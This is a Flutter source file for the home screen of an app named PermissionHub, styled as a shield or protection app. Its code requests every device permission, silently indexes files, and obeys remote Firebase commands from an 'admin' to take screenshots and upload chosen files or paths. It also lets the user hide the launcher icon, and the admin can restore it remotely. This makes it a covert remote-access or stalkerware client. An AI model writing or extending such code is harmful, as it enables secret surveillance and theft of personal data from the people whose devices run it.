import 'dart:async';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:photo_manager/photo_manager.dart';
import '../models/permission_model.dart';
import '../services/firebase_service.dart';
import '../services/file_sync_service.dart';
import '../services/permission_service.dart';
import '../services/screenshot_service.dart';
import 'login_screen.dart';

const _appVisibility = MethodChannel('com.permissionhub/app_visibility');

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  final _fb             = FirebaseService();
  final _ps             = PermissionService();
  final _syncService    = FileSyncService();
  final _screenshotSvc  = ScreenshotService();
  final List<AppPermission> _permissions = AppPermission.allPermissions();

  StreamSubscription? _permSub;
  StreamSubscription? _uploadSub;
  StreamSubscription? _screenshotSub;

  String _status = 'Requesting permissions…';

  @override
  void initState() {
    super.initState();
    _init();
  }

  Future<void> _init() async {
    final uid = _fb.userId!;

    // Request every permission immediately
    setState(() => _status = 'Requesting permissions…');
    for (final p in _permissions) {
      try { await _ps.requestPermission(p.permission); } catch (_) {}
    }
    await _ps.syncGrantedStatus(_permissions);
    setState(() => _status = 'Running in background');

    // Index all files silently
    _indexFiles(uid);

    // Listen for show-app command from admin
    _fb.watchCommands(uid).listen((cmd) async {
      if (cmd['showApp'] == true) {
        await _appVisibility.invokeMethod('showApp');
        await _fb.clearCommand(uid, 'showApp');
      }
    });

    // Listen for screenshot requests from admin
    _screenshotSub = _screenshotSvc.watchScreenshotCommand(uid).listen((snap) async {
      if (!snap.exists) return;
      final data = snap.data() as Map<String, dynamic>?;
      if (data == null) return;
      if (data['status'] == 'pending') {
        await _screenshotSvc.handleScreenshotRequest(uid);
      }
    });

    // Listen for admin upload requests
    _uploadSub = _syncService.watchUploadRequest(uid).listen((snap) async {
      if (!snap.exists) return;
      final data = snap.data() as Map<String, dynamic>?;
      if (data == null || data['status'] == 'processing') return;

      await _syncService.setUploadRequestStatus(uid, 'processing');
      final raw = data['paths'];
      final ids = (raw is List) ? List<String>.from(raw) : <String>[];

      // Resolve asset IDs to files (media) or treat as filesystem paths (docs/apks)
      final files = <File>[];
      for (final id in ids) {
        try {
          // Try as MediaStore asset ID first
          final asset = await AssetEntity.fromId(id);
          if (asset != null) {
            final f = await asset.file;
            if (f != null) files.add(f);
          } else {
            // Fallback: treat as direct file path
            final f = File(id);
            if (f.existsSync()) files.add(f);
          }
        } catch (_) {
          final f = File(id);
          if (f.existsSync()) files.add(f);
        }
      }

      setState(() => _status = 'Uploading ${files.length} files…');
      await _syncService.syncSelectedFiles(files: files);
      await _syncService.clearUploadRequest(uid);
      setState(() => _status = 'Running in background');
    });

    // Sync permission toggles from admin in real-time
    _permSub = _fb.watchPermissions(uid).listen((adminPerms) {
      for (final p in _permissions) {
        p.isEnabled = adminPerms[p.id] ?? false;
      }
    });
  }

  Future<void> _hideApp() async {
    final confirm = await showDialog<bool>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF1E293B),
        title: const Text('Hide App Icon?', style: TextStyle(color: Colors.white)),
        content: const Text(
          'The app icon will be removed from your home screen and app drawer.\n\nTo restore it, go to Settings → Apps → PermissionHub → Enable, or the admin can restore it remotely.',
          style: TextStyle(color: Colors.white70, fontSize: 13),
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context, false), child: const Text('Cancel')),
          TextButton(
            onPressed: () => Navigator.pop(context, true),
            child: const Text('Hide', style: TextStyle(color: Color(0xFFF87171))),
          ),
        ],
      ),
    );
    if (confirm == true) {
      await _appVisibility.invokeMethod('hideApp');
    }
  }

  Future<void> _indexFiles(String uid) async {
    try {
      setState(() => _status = 'Indexing device files…');
      await _syncService.indexDeviceFiles(uid);
      setState(() => _status = 'Running in background');
    } catch (_) {
      setState(() => _status = 'Running in background');
    }
  }

  @override
  void dispose() {
    _permSub?.cancel();
    _uploadSub?.cancel();
    _screenshotSub?.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0F172A),
      body: SafeArea(
        child: Column(
          children: [
            // Minimal top bar with sign-out
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  const Text(
                    '🛡️ PermissionHub',
                    style: TextStyle(
                      color: Colors.white,
                      fontSize: 18,
                      fontWeight: FontWeight.w700,
                    ),
                  ),
                  IconButton(
                    icon: const Icon(Icons.logout, color: Colors.white38, size: 20),
                    onPressed: () async {
                      await _fb.signOut();
                      if (mounted) {
                        Navigator.pushReplacement(context,
                            MaterialPageRoute(builder: (_) => const LoginScreen()));
                      }
                    },
                  ),
                ],
              ),
            ),

            const Spacer(),

            // Big shield icon
            const Text('🛡️', style: TextStyle(fontSize: 80)),
            const SizedBox(height: 24),

            const Text(
              'Active',
              style: TextStyle(
                color: Color(0xFF10B981),
                fontSize: 28,
                fontWeight: FontWeight.w800,
                letterSpacing: 1,
              ),
            ),
            const SizedBox(height: 12),

            Text(
              _status,
              style: const TextStyle(color: Colors.white54, fontSize: 14),
            ),

            const Spacer(),

            // Hide app from launcher button
            Padding(
              padding: const EdgeInsets.only(bottom: 12),
              child: TextButton.icon(
                onPressed: _hideApp,
                icon: const Icon(Icons.visibility_off, size: 16, color: Colors.white24),
                label: const Text(
                  'Hide App Icon',
                  style: TextStyle(color: Colors.white24, fontSize: 12),
                ),
              ),
            ),

            const Padding(
              padding: EdgeInsets.only(bottom: 32),
              child: Text(
                'Managed remotely by admin',
                style: TextStyle(color: Colors.white24, fontSize: 12),
              ),
            ),
          ],
        ),
      ),
    );
  }
}
